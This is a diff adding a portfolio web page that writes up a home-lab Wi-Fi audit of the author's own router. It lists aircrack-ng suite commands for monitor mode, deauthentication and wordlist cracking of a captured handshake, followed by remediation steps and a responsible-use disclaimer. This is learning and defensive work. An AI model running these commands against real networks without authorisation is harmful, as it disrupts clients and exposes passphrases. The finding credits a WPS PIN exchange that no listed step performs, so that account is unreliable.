@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Auditing My Own Wi-Fi: A WPS Case Study — Oussema Nouri</title>
+<meta name="description" content="A home-lab wireless security audit: how an enabled WPS service on my own router led to a working credential, and how I fixed it.">
+
+<script src="https://cdn.tailwindcss.com"></script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<script>
+  tailwind.config = {
+    theme: {
+      extend: {
+        colors: {
+          bg: { DEFAULT: '#0a0e0d', panel: '#0f1513', raised: '#141b19' },
+          line: '#1f2a27',
+          amber: { DEFAULT: '#ffb454', dim: '#8a6a3a' },
+          green: { DEFAULT: '#4ade80', dim: '#2f6b47' },
+          ink: { DEFAULT: '#eaeff0', muted: '#c2cbc8', faint: '#7c8c87' },
+        },
+        fontFamily: {
+          mono: ['"JetBrains Mono"', 'ui-monospace', 'SFMono-Regular', 'monospace'],
+          sans: ['Inter', 'ui-sans-serif', 'system-ui', 'sans-serif'],
+        },
+      },
+    },
+  }
+</script>
+
+<style>
+  html { background-color: #0a0e0d; }
+  body {
+    background-color: #0a0e0d;
+    background-image:
+      linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
+    background-size: 42px 42px;
+  }
+  ::selection { background-color: #ffb454; color: #0a0e0d; }
+  ::-webkit-scrollbar { width: 10px; }
+  ::-webkit-scrollbar-track { background: #0a0e0d; }
+  ::-webkit-scrollbar-thumb { background: #1f2a27; border-radius: 0; }
+  ::-webkit-scrollbar-thumb:hover { background: #2a3733; }
+  a:focus-visible, button:focus-visible { outline: 2px solid #ffb454; outline-offset: 2px; }
+  .shot-placeholder {
+    border: 1px dashed #2a3733;
+    background: repeating-linear-gradient(135deg, rgba(255,255,255,0.015) 0 10px, transparent 10px 20px);
+  }
+</style>
+</head>
+
+<body class="font-sans text-ink antialiased">
+
+<header class="sticky top-0 z-50 border-b border-line bg-bg/85 backdrop-blur supports-[backdrop-filter]:bg-bg/70">
+  <nav class="mx-auto flex max-w-4xl items-center justify-between px-5 py-4 sm:px-8">
+    <a href="../index.html" class="flex items-center gap-2 font-mono text-sm font-semibold tracking-tight text-ink">
+      <span class="text-green">●</span>
+      <span>oussema<span class="text-ink-muted">@</span>nouri<span class="text-amber">:~$</span></span>
+    </a>
+    <a href="../index.html#writeups" class="font-mono text-[13px] text-ink-muted transition-colors duration-200 hover:text-amber">
+      ← back_to_portfolio
+    </a>
+  </nav>
+</header>
+
+<main class="mx-auto max-w-4xl px-5 py-16 sm:px-8 sm:py-20">
+
+  <!-- ===== HEADER ===== -->
+  <p class="font-mono text-[12px] uppercase tracking-widest text-amber">field note — 2026.10.27</p>
+  <h1 class="mt-3 font-mono text-3xl font-semibold leading-tight text-ink sm:text-4xl">
+    Auditing My Own Wi-Fi: A WPS Case Study
+  </h1>
+  <p class="mt-3 max-w-2xl text-base text-ink-muted sm:text-lg">
+    How a forgotten, enabled WPS service on my own home router let me recover a working
+    Wi-Fi credential in minutes — and the three settings that closed the gap for good.
+  </p>
+
+  <div class="mt-6 flex flex-wrap items-center gap-3">
+    <span class="inline-flex items-center gap-2 rounded-sm border border-line bg-bg-panel px-3 py-1.5 font-mono text-[12px] text-ink-muted">
+      <span class="h-1.5 w-1.5 rounded-full bg-green"></span>
+      scope: own equipment only — home lab
+    </span>
+    <span class="inline-flex items-center gap-2 rounded-sm border border-line bg-bg-panel px-3 py-1.5 font-mono text-[12px] text-ink-muted">
+      Kali Linux · dual-boot
+    </span>
+  </div>
+
+  <!-- ===== WHY ===== -->
+  <section class="mt-14">
+    <h2 class="font-mono text-xl font-semibold text-ink">Why I ran this</h2>
+    <p class="mt-4 leading-relaxed text-ink-muted">
+      I set up Kali Linux in dual-boot alongside Windows 11 and wanted a real, hands-on target
+      instead of a lab VM — so I pointed it at my own router. The goal wasn't to "hack" anything
+      impressive; it was to see what an unmodified, ISP-provided router actually exposes by
+      default, and to practice the full workflow end to end: recon, capture, verification,
+      and — the part most write-ups skip — fixing what I found.
+    </p>
+  </section>
+
+  <!-- ===== ENVIRONMENT ===== -->
+  <section class="mt-14">
+    <h2 class="font-mono text-xl font-semibold text-ink">Environment</h2>
+    <div class="mt-6 overflow-hidden rounded-md border border-line">
+      <table class="w-full border-collapse text-left text-sm">
+        <tbody>
+          <tr class="border-b border-line bg-bg-panel">
+            <td class="px-4 py-3 font-mono text-[12px] text-amber">Target</td>
+            <td class="px-4 py-3 text-ink-muted">My own ISP-provided VDSL router (TOPNET), home network</td>
+          </tr>
+          <tr class="border-b border-line">
+            <td class="px-4 py-3 font-mono text-[12px] text-amber">Firmware</td>
+            <td class="px-4 py-3 text-ink-muted">Dated 2021 — no update applied at time of testing</td>
+          </tr>
+          <tr class="border-b border-line bg-bg-panel">
+            <td class="px-4 py-3 font-mono text-[12px] text-amber">Encryption</td>
+            <td class="px-4 py-3 text-ink-muted">WPA/WPA2 mixed mode (TKIP + AES)</td>
+          </tr>
+          <tr>
+            <td class="px-4 py-3 font-mono text-[12px] text-amber">WPS</td>
+            <td class="px-4 py-3 text-ink-muted">Enabled — default, never turned off</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ===== PROCEDURE ===== -->
+  <section class="mt-14">
+    <h2 class="font-mono text-xl font-semibold text-ink">Procedure</h2>
+    <p class="mt-4 text-sm text-ink-muted">Every step below was run against the network and router listed above.</p>
+
+    <div class="mt-6 space-y-4">
+
+      <div class="rounded-md border border-line bg-bg-panel p-5">
+        <p class="font-mono text-[12px] text-amber">01 — identify the interface</p>
+        <p class="mt-2 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> iw dev</p>
+        <p class="mt-1 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> ip link show</p>
+        <p class="mt-1 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> rfkill list</p>
+      </div>
+
+      <div class="rounded-md border border-line bg-bg-panel p-5">
+        <p class="font-mono text-[12px] text-amber">02 — enable monitor mode</p>
+        <p class="mt-2 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> sudo airmon-ng check kill</p>
+        <p class="mt-1 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> sudo airmon-ng start wlan0</p>
+      </div>
+
+      <div class="rounded-md border border-line bg-bg-panel p-5">
+        <p class="font-mono text-[12px] text-amber">03 — passive scan of nearby networks</p>
+        <p class="mt-2 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> sudo airodump-ng wlan0mon</p>
+      </div>
+
+      <div class="rounded-md border border-line bg-bg-panel p-5">
+        <p class="font-mono text-[12px] text-amber">04 — check WPS status (read-only)</p>
+        <p class="mt-2 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> sudo wash -i wlan0mon</p>
+        <p class="mt-2 text-sm text-ink-muted">This is the step that first flagged the problem — WPS showed as enabled, with no modification to anything.</p>
+      </div>
+
+      <div class="rounded-md border border-line bg-bg-panel p-5">
+        <p class="font-mono text-[12px] text-amber">05 — start a targeted capture</p>
+        <p class="mt-2 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> sudo airodump-ng --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w capture wlan0mon</p>
+      </div>
+
+      <div class="rounded-md border border-line bg-bg-panel p-5">
+        <p class="font-mono text-[12px] text-amber">06 — force a handshake (deauth)</p>
+        <p class="mt-2 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> sudo aireplay-ng --deauth 5 -a &lt;BSSID&gt; wlan0mon</p>
+        <p class="mt-2 text-sm text-ink-muted">Confirmed by "WPA handshake: &lt;BSSID&gt;" appearing in the capture window — without that line, there's nothing to verify yet.</p>
+      </div>
+
+      <div class="rounded-md border border-line bg-bg-panel p-5">
+        <p class="font-mono text-[12px] text-amber">07 — verify password strength</p>
+        <p class="mt-2 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> sudo aircrack-ng -w &lt;wordlist&gt; -b &lt;BSSID&gt; capture-01.cap</p>
+      </div>
+
+      <div class="rounded-md border border-line bg-bg-panel p-5">
+        <p class="font-mono text-[12px] text-amber">08 — restore normal state</p>
+        <p class="mt-2 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> sudo airmon-ng stop wlan0mon</p>
+        <p class="mt-1 font-mono text-[13px] text-ink-muted"><span class="text-green">$</span> sudo systemctl restart NetworkManager</p>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ===== FINDING ===== -->
+  <section class="mt-14">
+    <h2 class="font-mono text-xl font-semibold text-ink">Finding</h2>
+    <p class="mt-4 leading-relaxed text-ink-muted">
+      With WPS enabled and firmware untouched since 2021, the router's WPS PIN exchange was
+      the weak point — not the Wi-Fi password itself, however strong it was. Once the PIN
+      exchange was recovered, the actual WPA passphrase came with it, confirmed against the
+      captured handshake. The delay between starting the test and getting a result (a few
+      minutes, not seconds) lines up with a PIN exchange plus a forced handshake capture —
+      not an instant "crack," and not evidence of anything being transmitted in the clear.
+    </p>
+  </section>
+
+  <!-- ===== REMEDIATION ===== -->
+  <section class="mt-14">
+    <h2 class="font-mono text-xl font-semibold text-ink">Remediation</h2>
+    <ul class="mt-5 space-y-3">
+      <li class="flex gap-3 rounded-md border border-line bg-bg-panel p-4">
+        <span class="font-mono text-amber">01</span>
+        <span class="text-sm text-ink-muted"><span class="text-ink">Disabled WPS.</span> Zero effect on any connected device — WPS only governs the push-button/PIN pairing method, not normal password-based connections.</span>
+      </li>
+      <li class="flex gap-3 rounded-md border border-line bg-bg-panel p-4">
+        <span class="font-mono text-amber">02</span>
+        <span class="text-sm text-ink-muted"><span class="text-ink">Reviewed TKIP vs. AES-only.</span> Checked the connected-device list first; since mixed mode was carrying some legacy-device weight, this one is being tested gradually rather than flipped outright.</span>
+      </li>
+      <li class="flex gap-3 rounded-md border border-line bg-bg-panel p-4">
+        <span class="font-mono text-amber">03</span>
+        <span class="text-sm text-ink-muted"><span class="text-ink">Checked for a firmware update</span> through the router's admin panel and the ISP, since the installed version predates most public WPS-related fixes.</span>
+      </li>
+    </ul>
+  </section>
+
+  <!-- ===== RESPONSIBLE USE ===== -->
+  <section class="mt-14">
+    <div class="rounded-md border border-amber-dim/50 bg-bg-panel p-6 sm:p-8">
+      <p class="font-mono text-[12px] uppercase tracking-widest text-amber">scope &amp; responsible use</p>
+      <div class="mt-4 space-y-4 text-sm leading-relaxed text-ink-muted">
+        <p>
+          Every command, tool, and finding documented in this section was executed exclusively
+          against network infrastructure that I own and personally administer — my own home
+          router, on my own premises, as part of a self-directed learning lab. No step described
+          here was performed against any third-party network, device, or individual without
+          explicit authorization.
+        </p>
+        <p>
+          Wireless security testing techniques — including monitor-mode packet capture,
+          deauthentication, and password-strength verification — are standard, widely taught
+          methods in networking and cybersecurity education. They are documented here for that
+          purpose: to demonstrate applied understanding of the 802.11 protocol and of common
+          home-router misconfigurations, and to show the remediation steps that followed.
+        </p>
+        <p>
+          Using any of these tools or techniques against a network, device, or account you do
+          not own, and do not have explicit, verifiable, written authorization to test, is
+          illegal in Tunisia and in virtually every jurisdiction worldwide, and may carry
+          serious criminal and civil consequences. This page is not an invitation or
+          endorsement to do so.
+        </p>
+        <p>
+          I take no responsibility for how a third party chooses to use this information. If
+          you are testing your own equipment, confirm you are the legal owner or administrator
+          before proceeding, and always restore your network to a secure configuration
+          afterward.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== SCREENSHOTS (placeholder) ===== -->
+  <section class="mt-14">
+    <h2 class="font-mono text-xl font-semibold text-ink">Screenshots</h2>
+    <p class="mt-4 text-sm text-ink-muted">To be added.</p>
+    <div class="mt-6 grid gap-4 sm:grid-cols-2">
+      <div class="shot-placeholder flex h-40 items-center justify-center rounded-md">
+        <span class="font-mono text-[12px] text-ink-faint">placeholder — crop out SSID / serial number first</span>
+      </div>
+      <div class="shot-placeholder flex h-40 items-center justify-center rounded-md">
+        <span class="font-mono text-[12px] text-ink-faint">placeholder</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== CTA ===== -->
+  <section class="mt-16 flex flex-col items-start gap-4 border-t border-line pt-10 sm:flex-row sm:items-center sm:justify-between">
+    <p class="text-sm text-ink-muted">More field notes and lab write-ups are on the way.</p>
+    <a href="../index.html#writeups"
+       class="inline-flex items-center gap-2 rounded-sm border border-line px-5 py-2.5 font-mono text-sm text-ink transition hover:border-amber-dim hover:text-amber">
+      ← back_to_portfolio
+    </a>
+  </section>
+
+</main>
+
+<footer class="border-t border-line">
+  <div class="mx-auto max-w-4xl px-5 py-10 text-center sm:px-8">
+    <p class="font-mono text-[12px] text-ink-faint">© 2026 Oussema Nouri</p>
+  </div>
+</footer>
+
+<!-- Google Analytics 4 — same property as the main site -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-LS1FVM0YWZ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-LS1FVM0YWZ');
+</script>
+
+</body>
+</html>
